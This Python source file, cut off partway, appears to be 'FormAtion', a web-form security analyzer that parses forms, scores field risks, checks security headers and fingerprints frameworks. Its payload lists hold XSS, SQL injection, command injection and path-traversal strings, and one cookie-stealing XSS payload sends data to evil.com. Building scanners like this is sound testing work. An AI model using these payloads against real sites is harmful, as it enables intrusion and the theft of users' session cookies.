#!/usr/bin/env python3
"""
FormAtion - Advanced Web Form Analysis Module for FormPoison
PortSwigger Research-Based Web Application Security Analyzer
"""

import asyncio
import aiohttp
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import json
import ssl
import hashlib
import re
from datetime import datetime
from typing import Dict, List, Optional, Any, Set, Tuple
from dataclasses import dataclass, field, asdict
from enum import Enum
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich import box
from rich.text import Text
from rich.syntax import Syntax
from rich.layout import Layout
from rich.tree import Tree
import logging
import copy

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('FormAtion')

console = Console()

class ThreatLevel(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

class VulnerabilityType(Enum):
    XSS_REFLECTED = "Reflected XSS"
    XSS_STORED = "Stored XSS"
    XSS_DOM = "DOM-based XSS"
    XSS_MUTATION = "Mutation XSS"
    SQL_INJECTION = "SQL Injection"
    CSRF = "Cross-Site Request Forgery"
    FILE_UPLOAD = "Malicious File Upload"
    COMMAND_INJECTION = "Command Injection"
    XXE = "XML External Entity"
    SSRF = "Server-Side Request Forgery"
    OPEN_REDIRECT = "Open Redirect"
    IDOR = "Insecure Direct Object Reference"
    PARAMETER_TAMPERING = "Parameter Tampering"
    TEMPLATE_INJECTION = "Template Injection"
    PROTOTYPE_POLLUTION = "Prototype Pollution"
    HTTP_PARAMETER_POLLUTION = "HTTP Parameter Pollution"
    CORS_MISCONFIGURATION = "CORS Misconfiguration"
    CLICKJACKING = "Clickjacking"

@dataclass
class FieldAnalysis:
    element_type: str = ""
    field_type: str = ""
    name: str = ""
    id: str = ""
    value: str = ""
    attributes: Dict[str, str] = field(default_factory=dict)
    suspicious_patterns: List[str] = field(default_factory=list)
    field_category: str = 'other'
    portswigger_risks: List[str] = field(default_factory=list)
    is_text_input: bool = False
    threat_level: str = 'low'
    security_implications: List[str] = field(default_factory=list)
    potential_payloads: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return asdict(self)

@dataclass
class FormAnalysis:
    form_id: int = 0
    action: str = ""
    method: str = ""
    enctype: str = ""
    all_fields: List[FieldAnalysis] = field(default_factory=list)
    text_input_fields: List[FieldAnalysis] = field(default_factory=list)
    non_text_fields: List[FieldAnalysis] = field(default_factory=list)
    vulnerability_indicators: List[str] = field(default_factory=list)
    complexity_score: int = 0
    portswigger_vectors: List[str] = field(default_factory=list)
    html_source: str = ''
    
    def to_dict(self) -> Dict:
        return {
            'form_id': self.form_id,
            'action': self.action,
            'method': self.method,
            'enctype': self.enctype,
            'all_fields': [f.to_dict() for f in self.all_fields],
            'text_input_fields': [f.to_dict() for f in self.text_input_fields],
            'non_text_fields': [f.to_dict() for f in self.non_text_fields],
            'vulnerability_indicators': self.vulnerability_indicators,
            'complexity_score': self.complexity_score,
            'portswigger_vectors': self.portswigger_vectors,
            'html_source': self.html_source
        }

@dataclass
class TechnologyInfo:
    name: str
    version: Optional[str]
    confidence: str
    category: str
    evidence: str
    vulnerabilities: List[Dict[str, str]] = field(default_factory=list)

class FormAtionAnalyzer:
    """Advanced form analysis engine with comprehensive security assessment."""
    
    VERSION = "2.0.0"
    
    def __init__(self, url: str, user_agent: Optional[str] = None, 
                 proxies: Optional[str] = None, timeout: int = 30,
                 max_redirects: int = 5, verify_ssl: bool = True):
        self.url = url
        self.user_agent = user_agent or f"FormAtion/{self.VERSION} (Security Analyzer)"
        self.proxies = proxies
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.max_redirects = max_redirects
        self.verify_ssl = verify_ssl
        self.session: Optional[aiohttp.ClientSession] = None
        
        # Results containers
        self.results = {
            'url': url,
            'scan_timestamp': datetime.now().isoformat(),
            'forms_analysis': [],
            'security_headers': {},
            'technology_stack': {},
            'recommendations': [],
            'formpoison_flags': [],
            'attack_vectors': [],
            'compliance_report': {},
            'risk_assessment': {},
            'remediation_plan': [],
            'executive_summary': {}
        }
        
        self.response_headers: Dict[str, str] = {}
        self.page_content: Optional[str] = None
        self.parsed_url = urlparse(url)
        
        # Advanced configuration
        self.security_patterns = self._load_security_patterns()
        self.technology_fingerprints = self._load_technology_fingerprints()
        self.payload_suggestions = self._load_payload_suggestions()
        
    def _load_security_patterns(self) -> Dict[str, List[str]]:
        """Load comprehensive security testing patterns."""
        return {
            'xss_vectors': [
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                'javascript:alert(1)',
                '<img src=x onerror=alert(1)>',
                '<svg/onload=alert(1)>',
                '{{constructor.constructor("alert(1)")()}}',
                '${alert(1)}'
            ],
            'sql_injection': [
                "' OR '1'='1",
                "1' OR '1'='1' --",
                "admin'--",
                "1; DROP TABLE users--",
                "' UNION SELECT NULL--"
            ],
            'command_injection': [
                '; ls -la',
                '| cat /etc/passwd',
                '`id`',
                '$(whoami)',
                '&& dir'
            ],
            'file_inclusion': [
                '../../etc/passwd',
                '....//....//etc/passwd',
                'file:///etc/passwd',
                'php://filter/convert.base64-encode/resource=index.php'
            ]
        }
    
    def _load_technology_fingerprints(self) -> Dict[str, Dict[str, Any]]:
        """Load technology detection fingerprints."""
        return {
            'frameworks': {
                'React': {
                    'patterns': ['react', 'react-dom', '_reactRootContainer', '__REACT_DEVTOOLS_GLOBAL_HOOK__'],
                    'version_regex': r'React v?(\d+\.\d+\.\d+)',
                    'category': 'frontend'
                },
                'Vue.js': {
                    'patterns': ['vue', 'vue.js', '__vue__', 'v-bind', 'v-model'],
                    'version_regex': r'Vue\.js v?(\d+\.\d+\.\d+)',
                    'category': 'frontend'
                },
                'Angular': {
                    'patterns': ['angular', 'ng-version', 'ng-app', 'angular.module'],
                    'version_regex': r'Angular(?:JS)? v?(\d+\.\d+\.\d+)',
                    'category': 'frontend'
                },
                'Django': {
                    'patterns': ['django', 'csrfmiddlewaretoken', 'django.jQuery'],
                    'version_regex': r'Django ([\d.]+)',
                    'category': 'backend'
                },
                'Laravel': {
                    'patterns': ['laravel', 'csrf-token', 'laravel_session'],
                    'version_regex': r'Laravel v?(\d+\.\d+\.\d+)',
                    'category': 'backend'
                }
            },
            'cms': {
                'WordPress': {
                    'patterns': ['wp-content', 'wp-includes', 'wp-json', 'wordpress'],
                    'version_regex': r'WordPress ([\d.]+)',
                    'meta_key': 'generator'
                },
                'Drupal': {
                    'patterns': ['drupal', 'sites/default', 'drupalSettings'],
                    'version_regex': r'Drupal ([\d.]+)',
                    'meta_key': 'generator'
                },
                'Joomla': {
                    'patterns': ['joomla', 'media/system/js/', 'com_content'],
                    'version_regex': r'Joomla! ([\d.]+)',
                    'meta_key': 'generator'
                }
            }
        }
    
    def _load_payload_suggestions(self) -> Dict[str, List[str]]:
        """Load payload suggestions based on field types and frameworks."""
        return {
            'login': [
                "admin' OR '1'='1' --",
                "admin'--",
                "' OR 1=1--",
                "admin'/*",
                "') OR ('1'='1"
            ],
            'search': [
                "<script>alert('XSS')</script>",
                "') UNION SELECT * FROM users--",
                "${7*7}",
                "{{7*7}}",
                "1 AND 1=1"
            ],
            'content': [
                "<img src=x onerror=alert(1)>",
                "<svg/onload=fetch('http://evil.com/steal?cookie='+document.cookie)>",
                "javascript:alert(document.domain)",
                "{{this.constructor.constructor('alert(1)')()}}"
            ]
        }
    
    async def __aenter__(self):
        """Async context manager entry."""
        connector = aiohttp.TCPConnector(ssl=self.verify_ssl, limit=10)
        self.session = aiohttp.ClientSession(
            timeout=self.timeout,
            connector=connector,
            headers={'User-Agent': self.user_agent}
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        if self.session:
            await self.session.close()
    
    async def analyze_site(self) -> Dict[str, Any]:
        """Main analysis orchestration method."""
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console,
            transient=True
        ) as progress:
            task = progress.add_task("[cyan]Analyzing web forms...", total=None)
            
            console.print(Panel.fit(
                f"🔍 [bold cyan]FormAtion {self.VERSION} - Advanced Web Form Analysis[/bold cyan]\n"
                f"[dim]Target: {self.url}[/dim]\n"
                f"[dim]Methodology: PortSwigger Research-Based[/dim]",
                border_style="cyan"
            ))
            
            # Phase 1: Fetch and parse
            progress.update(task, description="[cyan]Fetching page content...")
            self.page_content = await self._fetch_page()
            if not self.page_content:
                console.print("[bold red]❌ Failed to fetch page content[/bold red]")
                return self.results
            
            # Phase 2: Form analysis
            progress.update(task, description="[cyan]Analyzing forms and fields...")
            await self._analyze_forms_deep()
            
            # Phase 3: Security headers
            progress.update(task, description="[cyan]Checking security headers...")
            await self._analyze_security_headers_comprehensive()
            
            # Phase 4: Technology detection
            progress.update(task, description="[cyan]Detecting technology stack...")
            await self._detect_technology_stack_advanced()
            
            # Phase 5: Advanced scanning
            progress.update(task, description="[cyan]Running advanced security checks...")
            await self._run_advanced_security_checks()
            
            # Phase 6: Generate reports
            progress.update(task, description="[cyan]Generating comprehensive report...")
            self._generate_recommendations_enhanced()
            self._generate_compliance_report()
            self._create_risk_assessment()
            self._build_remediation_plan()
            
            # Display results
            self._display_comprehensive_report()
            
        return self.results
    
    async def _fetch_page(self) -> Optional[str]:
        """Enhanced page fetching with retry logic and error handling."""
        max_retries = 3
        for attempt in range(max_retries):
            try:
                if not self.session:
                    await self.__aenter__()
                
                async with self.session.get(
                    self.url,
                    proxy=self.proxies,
                    allow_redirects=True,
                    max_redirects=self.max_redirects
                ) as response:
                    # Store response metadata
                    self.results['response_code'] = response.status
                    self.results['content_type'] = response.headers.get('Content-Type', '')
                    self.results['server'] = response.headers.get('Server', '')
                    self.results['response_size'] = response.headers.get('Content-Length', 'Unknown')
                    self.results['final_url'] = str(response.url)
                    
                    # Store all headers (convert to lowercase keys)
                    self.response_headers = {k.lower(): v for k, v in response.headers.items()}
                    
                    # Check for redirects
                    if response.history:
                        self.results['redirect_chain'] = [
                            {'url': str(h.url), 'status': h.status} 
                            for h in response.history
                        ]
                    
                    content = await response.text()
                    self.results['page_size'] = len(content)
                    
                    return content
                    
            except asyncio.TimeoutError:
                logger.warning(f"Timeout on attempt {attempt + 1}")
                if attempt == max_retries - 1:
                    console.print(f"[red]❌ Timeout fetching {self.url}[/red]")
                    return None
                await asyncio.sleep(2 ** attempt)
                
            except aiohttp.ClientError as e:
                logger.error(f"Client error: {e}")
                if attempt == max_retries - 1:
                    console.print(f"[red]❌ Error fetching page: {str(e)}[/red]")
                    return None
                await asyncio.sleep(2 ** attempt)
                
            except Exception as e:
                logger.error(f"Unexpected error: {e}")
                console.print(f"[red]❌ Unexpected error: {str(e)}[/red]")
                return None
        
        return None
    
    async def _analyze_forms_deep(self) -> None:
        """Enhanced form analysis with deeper inspection."""
        if not self.page_content:
            return
        
        soup = BeautifulSoup(self.page_content, 'html.parser')
        
        # Find all forms
        forms = soup.find_all('form')
        
        console.print(f"\n[bold yellow]📋 Found {len(forms)} forms[/bold yellow]")
        
        for i, form in enumerate(forms):
            form_analysis = FormAnalysis(
                form_id=i + 1,
                action=form.get('action', ''),
                method=form.get('method', 'GET').upper(),
                enctype=form.get('enctype', ''),
                html_source=str(form)[:3000]
            )
            
            # Parse all interactive elements
            interactive_elements = {
                'inputs': form.find_all('input'),
                'textareas': form.find_all('textarea'),
                'selects': form.find_all('select'),
                'buttons': form.find_all('button'),
                'datalists': form.find_all('datalist'),
                'outputs': form.find_all('output'),
                'keygens': form.find_all('keygen')
            }
            
            all_fields = []
            for element_type, elements in interactive_elements.items():
                for element in elements:
                    field_info = self._analyze_field_enhanced(element, element_type)
                    all_fields.append(field_info)
                    
                    if field_info.is_text_input:
                        form_analysis.text_input_fields.append(field_info)
                    else:
                        form_analysis.non_text_fields.append(field_info)
            
            form_analysis.all_fields = all_fields
            
            # Perform deep analysis
            self._assess_form_vulnerability_enhanced(form_analysis)
            self._detect_portswigger_vectors_enhanced(form_analysis)
            self._analyze_form_behavior(form_analysis)
            
            self.results['forms_analysis'].append(form_analysis.to_dict())
    
    def _analyze_field_enhanced(self, field, element_type: str) -> FieldAnalysis:
        """Enhanced field analysis with deeper security insights."""
        field_type = field.get('type', 'text') if field.name == 'input' else field.name
        field_name = field.get('name', '')
        field_id = field.get('id', '')
        field_value = field.get('value', '')
        
        field_analysis = FieldAnalysis(
            element_type=element_type,
            field_type=field_type,
            name=field_name,
            id=field_id,
            value=field_value,
            attributes=dict(field.attrs),
            is_text_input=self._is_text_input_field_enhanced(field)
        )
        
        # Advanced categorization
        field_analysis.field_category = self._categorize_field_advanced(
            field_name, field_id, field_type, element_type, field_analysis.attributes
        )
        
        # Multi-layer pattern detection
        self._detect_suspicious_patterns_enhanced(field_analysis)
        
        # PortSwigger risk mapping
        self._detect_portswigger_risks_enhanced(field_analysis)
        
        # Security implications
        self._analyze_security_implications(field_analysis)
        
        # Suggest potential payloads
        self._suggest_payloads(field_analysis)
        
        # Threat level assessment
        self._assess_field_threat_level_enhanced(field_analysis)
        
        return field_analysis
    
    def _is_text_input_field_enhanced(self, field) -> bool:
        """Enhanced text input detection."""
        if field.name == 'textarea':
            return True
            
        if field.name == 'input':
            field_type = field.get('type', 'text').lower()
            text_input_types = [
                'text', 'password', 'email', 'search', 'url', 'tel', 
                'number', 'date', 'datetime', 'datetime-local', 'month', 
                'week', 'time', 'range', 'color', 'hidden'
            ]
            return field_type in text_input_types
            
        if field.name == 'select':
            return True
            
        return False
    
    def _categorize_field_advanced(self, name: str, id_: str, type_: str, 
                                   element_type: str, attributes: Dict[str, str]) -> str:
        """Advanced field categorization with more categories."""
        name_lower = name.lower()
        id_lower = id_.lower()
        
        # Priority-based categorization
        categories = {
            'password': ['password', 'pass', 'pwd', 'secret', 'passwd', 'pin', 'credentials'],
            'login': ['user', 'login', 'email', 'username', 'account', 'uid', 'uname'],
            'file_upload': ['file', 'upload', 'attachment', 'avatar', 'photo', 'image', 'document'],
            'search': ['search', 'query', 'q', 'keyword', 'find', 'lookup'],
            'content': ['comment', 'message', 'content', 'body', 'description', 'bio', 'text', 'post'],
            'contact': ['name', 'phone', 'tel', 'address', 'city', 'zip', 'state', 'country'],
            'hidden': ['hidden', 'csrf', 'token', 'nonce', 'session', 'state'],
            'choice': ['checkbox', 'radio', 'choice', 'option', 'select', 'preference'],
            'payment': ['credit', 'card', 'payment', 'billing', 'cc', 'cvv', 'expiry', 'amount'],
            'date': ['date', 'time', 'year', 'month', 'day', 'dob', 'birthday'],
            'url': ['url', 'link', 'website', 'href', 'redirect', 'callback'],
            'api': ['api_key', 'apikey', 'token', 'auth', 'bearer', 'jwt', 'access'],
            'database': ['id', 'uid', 'pid', 'item_id', 'record_id', 'object_id']
        }
        
        # Check by priority
        for category, keywords in categories.items():
            if any(keyword in name_lower or keyword in id_lower for keyword in keywords):
                if category == 'password' or type_ == 'password':
                    return 'password'
                elif category == 'hidden' or type_ == 'hidden':
                    return 'hidden'
                elif category == 'file_upload' or type_ == 'file':
                    return 'file_upload'
                return category
        
        # Check by element type
        if element_type == 'select':
            return 'dropdown'
        elif element_type == 'button' or type_ in ['submit', 'button', 'reset']:
            return 'button'
        
        return 'other'
    
    def _detect_suspicious_patterns_enhanced(self, field_analysis: FieldAnalysis) -> None:
        """Enhanced suspicious pattern detection."""
        name = field_analysis.name.lower()
        attrs = field_analysis.attributes
        field_type = field_analysis.field_type
        element_type = field_analysis.element_type
        
        # Client-side validation analysis
        if field_analysis.is_text_input:
            validation_attrs = ['maxlength', 'pattern', 'required', 'min', 'max', 'step', 'minlength']
            if not any(attr in attrs for attr in validation_attrs):
                field_analysis.suspicious_patterns.append('no_client_side_validation')
            
            # Check for weak validation
            if 'pattern' in attrs:
                weak_patterns = ['.*', '.+', '[\\s\\S]*', '^.*$']
                if attrs['pattern'] in weak_patterns:
                    field_analysis.suspicious_patterns.append('weak_validation_pattern')
        
        # Sensitive field exposure
        sensitive_names = ['csrf', 'token', 'auth', 'key', 'hash', 'nonce', 'session', 'jwt', 'bearer', 'api']
        if any(sensitive in name for sensitive in sensitive_names):
            field_analysis.suspicious_patterns.append('sensitive_field_exposed')
        
        # Autocomplete analysis
        if attrs.get('autocomplete') == 'on' and field_analysis.field_category in ['password', 'login']:
            field_analysis.suspicious_patterns.append('autocomplete_enabled_on_sensitive')
        
        # Hidden field data exposure
        if field_type == 'hidden' and field_analysis.value:
            if len(field_analysis.value) > 20:
                field_analysis.suspicious_patterns.append('hidden_field_with_large_value')
            
            # Check for base64 encoded data
            if re.match(r'^[A-Za-z0-9+/=]+$', field_analysis.value) and len(field_analysis.value) > 30:
                field_analysis.suspicious_patterns.append('possible_base64_in_hidden_field')
            
            # Check for JWT tokens
            if '.' in field_analysis.value and len(field_analysis.value) > 50:
                field_analysis.suspicious_patterns.append('possible_jwt_in_hidden_field')
        
        # Parameter tampering indicators
        if field_type in ['checkbox', 'radio'] and field_analysis.value:
            field_analysis.suspicious_patterns.append('predefined_choice_value_tampering')
        
        # Missing name attribute
        if not name and element_type != 'button':
            field_analysis.suspicious_patterns.append('missing_name_attribute')
        
        # Large maxlength
        if 'maxlength' in attrs and attrs['maxlength'].isdigit() and int(attrs['maxlength']) > 5000:
            field_analysis.suspicious_patterns.append('excessive_maxlength')
        
        # Disabled fields
        if attrs.get('disabled') is not None:
            field_analysis.suspicious_patterns.append('disabled_field_present')
        
        # Readonly fields
        if attrs.get('readonly') is not None:
            field_analysis.suspicious_patterns.append('readonly_field_present')
    
    def _detect_portswigger_risks_enhanced(self, field_analysis: FieldAnalysis) -> None:
        """Enhanced PortSwigger risk detection."""
        field_type = field_analysis.field_type
        field_category = field_analysis.field_category
        is_text_input = field_analysis.is_text_input
        name = field_analysis.name.lower()
        
        risk_map = {
            'content': ['reflected_xss', 'stored_xss', 'dom_xss', 'html_injection'],
            'search': ['reflected_xss', 'sql_injection', 'command_injection'],
            'login': ['sql_injection', 'nosql_injection', 'ldap_injection', 'authentication_bypass'],
            'password': ['credential_stuffing', 'brute_force'],
            'url': ['open_redirect', 'ssrf'],
            'file_upload': ['file_upload_xss', 'rce_upload', 'path_traversal', 'xxe_upload'],
            'api': ['api_key_exposure', 'jwt_tampering'],
            'payment': ['payment_injection', 'price_manipulation'],
            'database': ['idor', 'mass_assignment'],
            'hidden': ['csrf_token_analysis', 'parameter_pollution'],
            'choice': ['parameter_tampering', 'business_logic_bypass'],
            'contact': ['xss_reflected', 'html_injection']
        }
        
        if field_category in risk_map:
            field_analysis.portswigger_risks.extend(risk_map[field_category])
        
        # Type-specific risks
        if field_type == 'email':
            field_analysis.portswigger_risks.extend(['email_injection', 'header_injection'])
        elif field_type == 'number':
            field_analysis.portswigger_risks.extend(['integer_overflow', 'negative_value_injection'])
        elif field_type == 'date':
            field_analysis.portswigger_risks.extend(['date_injection', 'format_string'])
        
        # Remove duplicates
        field_analysis.portswigger_risks = list(set(field_analysis.portswigger_risks))
    
    def _analyze_security_implications(self, field_analysis: FieldAnalysis) -> None:
        """Analyze broader security implications of each field."""
        
        if field_analysis.field_category == 'password':
            if not any(attr in field_analysis.attributes for attr in ['minlength', 'pattern']):
                field_analysis.security_implications.append('weak_password_policy')
        
        if field_analysis.field_category == 'file_upload':
            if 'accept' not in field_analysis.attributes:
                field_analysis.security_implications.append('unrestricted_file_types')
        
        if field_analysis.field_category == 'hidden':
            if 'csrf' in field_analysis.name.lower() or 'token' in field_analysis.name.lower():
                field_analysis.security_implications.append('csrf_protection_detected')
            
            if 'id' in field_analysis.name.lower():
                field_analysis.security_implications.append('potential_idor')
    
    def _suggest_payloads(self, field_analysis: FieldAnalysis) -> None:
        """Suggest potential test payloads based on field analysis."""
        category = field_analysis.field_category
        
        if category in self.payload_suggestions:
            field_analysis.potential_payloads = self.payload_suggestions[category]
        
        # Add framework-specific payloads
        if 'react' in str(field_analysis.attributes).lower():
            field_analysis.potential_payloads.append('dangerouslySetInnerHTML')
        elif 'angular' in str(field_analysis.attributes).lower():
            field_analysis.potential_payloads.append('{{constructor.constructor("alert(1)")()}}')
    
    def _assess_field_threat_level_enhanced(self, field_analysis: FieldAnalysis) -> None:
        """Enhanced threat level assessment with scoring."""
        threat_score = 0
        
        # Risk-based scoring
        risk_weights = {
            'sql_injection': 5, 'rce_upload': 5, 'stored_xss': 4,
            'command_injection': 5, 'xxe_upload': 5, 'ssrf': 4,
            'reflected_xss': 3, 'file_upload_xss': 3, 'dom_xss': 3,
            'authentication_bypass': 4, 'idor': 3, 'open_redirect': 2,
            'csrf_token_analysis': 1, 'parameter_tampering': 2,
            'credential_stuffing': 2, 'brute_force': 2
        }
        
        for risk in field_analysis.portswigger_risks:
            threat_score += risk_weights.get(risk, 1)
        
        # Pattern-based scoring
        pattern_weights = {
            'no_client_side_validation': 2,
            'sensitive_field_exposed': 3,
            'hidden_field_with_large_value': 2,
            'possible_jwt_in_hidden_field': 3,
            'autocomplete_enabled_on_sensitive': 2,
            'unrestricted_file_types': 3,
            'weak_password_policy': 2
        }
        
        for pattern in field_analysis.suspicious_patterns:
            threat_score += pattern_weights.get(pattern, 1)
        
        # Determine threat level
        if threat_score >= 10:
            field_analysis.threat_level = 'critical'
        elif threat_score >= 7:
            field_analysis.threat_level = 'high'
        elif threat_score >= 4:
            field_analysis.threat_level = 'medium'
        elif threat_score >= 2:
            field_analysis.threat_level = 'low'
        else:
            field_analysis.threat_level = 'info'
    
    def _assess_form_vulnerability_enhanced(self, form_analysis: FormAnalysis) -> None:
        """Enhanced form vulnerability assessment."""
        score = 0
        indicators = []
        portswigger_vectors = []
        
        # Method-based risks
        if form_analysis.method == 'GET':
            score += 3
            indicators.append('get_method_data_exposure')
            portswigger_vectors.extend(['reflected_xss_via_get', 'url_parameter_injection'])
        
        # CSRF assessment
        has_csrf = any('csrf' in field.name.lower() or 'token' in field.name.lower() 
                      for field in form_analysis.all_fields)
        if not has_csrf:
            score += 5
            indicators.append('no_csrf_protection')
            portswigger_vectors.append('csrf_vulnerable_form')
        
        # Authentication analysis
        login_fields = sum(1 for field in form_analysis.text_input_fields if field.field_category == 'login')
        password_fields = sum(1 for field in form_analysis.text_input_fields if field.field_category == 'password')
        
        if login_fields > 0 and password_fields > 0:
            score += 4
            indicators.append('login_form_detected')
            portswigger_vectors.extend(['authentication_bypass', 'credential_stuffing', 'brute_force'])
            
            # Check for rate limiting indicators
            if not any('attempt' in field.name.lower() or 'captcha' in field.name.lower() 
                      for field in form_analysis.all_fields):
                indicators.append('possible_no_rate_limiting')
                portswigger_vectors.append('brute_force_no_ratelimit')
        
        # File upload risks
        upload_fields = [f for f in form_analysis.all_fields if f.field_category == 'file_upload']
        if upload_fields:
            score += 5
            indicators.append('file_upload_detected')
            portswigger_vectors.extend(['malicious_file_upload', 'stored_xss_via_files', 'rce_via_upload'])
            
            # Check for file type restrictions
            if not any('accept' in f.attributes for f in upload_fields):
                indicators.append('no_file_type_restriction')
                portswigger_vectors.append('unrestricted_file_upload')
        
        # Hidden field analysis
        hidden_with_values = [f for f in form_analysis.all_fields 
                             if 'hidden_field_with_value' in f.suspicious_patterns]
        if hidden_with_values:
            score += 3
            indicators.append('hidden_fields_with_values')
            portswigger_vectors.append('idor_via_hidden_fields')
        
        # Validation analysis
        unvalidated_fields = [f for f in form_analysis.text_input_fields 
                            if 'no_client_side_validation' in f.suspicious_patterns]
        if unvalidated_fields:
            score += len(unvalidated_fields) * 2
            indicators.append(f'{len(unvalidated_fields)}_unvalidated_fields')
            portswigger_vectors.append('input_validation_bypass')
        
        # Size/overflow risks
        if len(form_analysis.all_fields) > 15:
            score += 2
            indicators.append('large_form_structure')
            portswigger_vectors.append('size_overflow_attack')
        
        # Sensitive data exposure
        if any(f.field_category == 'payment' for f in form_analysis.all_fields):
            score += 5
            indicators.append('payment_form_detected')
            portswigger_vectors.extend(['payment_injection', 'sensitive_data_exposure'])
        
        form_analysis.complexity_score = score
        form_analysis.vulnerability_indicators = indicators
        form_analysis.portswigger_vectors = portswigger_vectors
    
    def _detect_portswigger_vectors_enhanced(self, form_analysis: FormAnalysis) -> None:
        """Enhanced PortSwigger vector detection."""
        
        # DOM XSS potential
        if any(f.field_category in ['search', 'content', 'url'] 
               for f in form_analysis.text_input_fields):
            form_analysis.portswigger_vectors.append('dom_xss_potential')
        
        # Template injection
        if any('{{' in f.value or '}}' in f.value or '${' in f.value 
               for f in form_analysis.text_input_fields):
            form_analysis.portswigger_vectors.append('template_injection_potential')
        
        # HTTP Parameter Pollution
        if form_analysis.method == 'GET' and len(form_analysis.text_input_fields) > 2:
            form_analysis.portswigger_vectors.append('http_parameter_pollution')
        
        # Prototype Pollution
        if any('__proto__' in f.name.lower() or 'constructor' in f.name.lower() 
               for f in form_analysis.all_fields):
            form_analysis.portswigger_vectors.append('prototype_pollution')
        
        # Business logic flaws
        if any(f.field_category == 'payment' for f in form_analysis.all_fields):
            if any(f.field_category == 'choice' for f in form_analysis.all_fields):
                form_analysis.portswigger_vectors.append('business_logic_price_manipulation')
        
        # Remove duplicates
        form_analysis.portswigger_vectors = list(set(form_analysis.portswigger_vectors))
    
    def _analyze_form_behavior(self, form_analysis: FormAnalysis) -> None:
        """Analyze form behavior and event handlers."""
        soup = BeautifulSoup(form_analysis.html_source, 'html.parser')
        
        # Check for JavaScript event handlers
        event_handlers = [
            'onclick', 'onsubmit', 'onchange', 'oninput', 'onfocus',
            'onblur', 'onkeyup', 'onkeydown', 'onmouseover', 'onload'
        ]
        
        for field in soup.find_all():
            for handler in event_handlers:
                if field.get(handler):
                    form_analysis.vulnerability_indicators.append(
                        f'event_handler_{handler}'
                    )
        
        # Check for AJAX/API endpoints
        if any('fetch' in str(field) or 'XMLHttpRequest' in str(field) 
               for field in soup.find_all('script')):
            form_analysis.vulnerability_indicators.append('ajax_form_submission')
            form_analysis.portswigger_vectors.append('api_endpoint_testing')
    
    async def _analyze_security_headers_comprehensive(self) -> None:
        """Comprehensive security headers analysis."""
        # FIX: Work with a copy of security headers to avoid modification during iteration
        security_headers_config = {
            'Content-Security-Policy': {
                'risk_level': 'high',
                'description': 'Content Security Policy',
                'compliance': ['PCI DSS', 'HIPAA', 'GDPR'],
                'recommendation': 'Implement strict CSP to prevent XSS attacks'
            },
            'X-Frame-Options': {
                'risk_level': 'medium',
                'description': 'Clickjacking Protection',
                'compliance': ['OWASP Top 10'],
                'recommendation': 'Set to DENY or SAMEORIGIN'
            },
            'Strict-Transport-Security': {
                'risk_level': 'high',
                'description': 'HSTS Enforcement',
                'compliance': ['PCI DSS', 'HIPAA'],
                'recommendation': 'Enable HSTS with max-age >= 31536000'
            },
            'X-Content-Type-Options': {
                'risk_level': 'low',
                'description': 'MIME Type Sniffing Protection',
                'compliance': ['OWASP Top 10'],
                'recommendation': 'Set to nosniff'
            },
            'X-XSS-Protection': {
                'risk_level': 'medium',
                'description': 'XSS Filter',
                'compliance': ['OWASP Top 10'],
                'recommendation': 'Set to 1; mode=block'
            },
            'Referrer-Policy': {
                'risk_level': 'low',
                'description': 'Referrer Information Control',
                'compliance': ['GDPR'],
                'recommendation': 'Set to strict-origin-when-cross-origin'
            },
            'Permissions-Policy': {
                'risk_level': 'medium',
                'description': 'Feature Policy',
                'compliance': ['OWASP Top 10'],
                'recommendation': 'Restrict unnecessary browser features'
            },
            'Cross-Origin-Resource-Policy': {
                'risk_level': 'high',
                'description': 'Cross-Origin Resource Sharing',
                'compliance': ['OWASP Top 10'],
                'recommendation': 'Set to same-origin or same-site'
            },
            'Cache-Control': {
                'risk_level': 'medium',
                'description': 'Cache Control',
                'compliance': ['PCI DSS'],
                'recommendation': 'Set to no-store for sensitive pages'
            }
        }
        
        # Create a new dictionary to avoid modifying during iteration
        headers_analysis = {}
        
        for header, config in security_headers_config.items():
            value = self.response_headers.get(header.lower())
            status = "✅ Present" if value else "❌ Missing"
            
            headers_analysis[header] = {
                'value': value,
                'status': status,
                'risk_level': config['risk_level'],
                'description': config['description'],
                'compliance': config['compliance'],
                'recommendation': config['recommendation'],
                'is_compliant': value is not None
            }
        
        # Additional header analysis - add after main loop
        if 'set-cookie' in self.response_headers:
            cookies = self.response_headers['set-cookie']
            cookie_secure = 'secure' in cookies.lower()
            cookie_httponly = 'httponly' in cookies.lower()
            cookie_samesite = 'samesite' in cookies.lower()
            
            cookie_security = {
                'secure': cookie_secure,
                'httponly': cookie_httponly,
                'samesite': cookie_samesite
            }
            
            all_secure = all(cookie_security.values())
            
            headers_analysis['Cookie-Security'] = {
                'value': str(cookie_security),
                'status': '⚠️ Partial' if not all_secure else '✅ Secure',
                'risk_level': 'high',
                'description': 'Cookie Security Attributes',
                'compliance': ['PCI DSS', 'GDPR'],
                'recommendation': 'Set HttpOnly, Secure, and SameSite=Strict',
                'is_compliant': all_secure
            }
        
        self.results['security_headers'] = headers_analysis
    
    async def _detect_technology_stack_advanced(self) -> None:
        """Advanced technology stack detection."""
        if not self.page_content:
            return
        
        soup = BeautifulSoup(self.page_content, 'html.parser')
        
        # Initialize tech stack with empty lists
        tech_stack = {
            'frontend_frameworks': [],
            'backend_frameworks': [],
            'cms': [],
            'web_servers': [],
            'programming_languages': [],
            'libraries': [],
            'analytics': [],
            'cdn': [],
            'security_features': [],
            'databases': [],
            'other_technologies': []
        }
        
        # Script-based detection
        scripts = soup.find_all('script')
        for script in scripts:
            src = script.get('src', '').lower()
            content = (script.string or '').lower()
            
            # Framework detection with version extraction
            for framework, fingerprint in self.technology_fingerprints['frameworks'].items():
                if any(pattern in src or pattern in content for pattern in fingerprint['patterns']):
                    version = None
                    if fingerprint.get('version_regex'):
                        version_match = re.search(fingerprint['version_regex'], src + content)
                        if version_match:
                            version = version_match.group(1)
                    
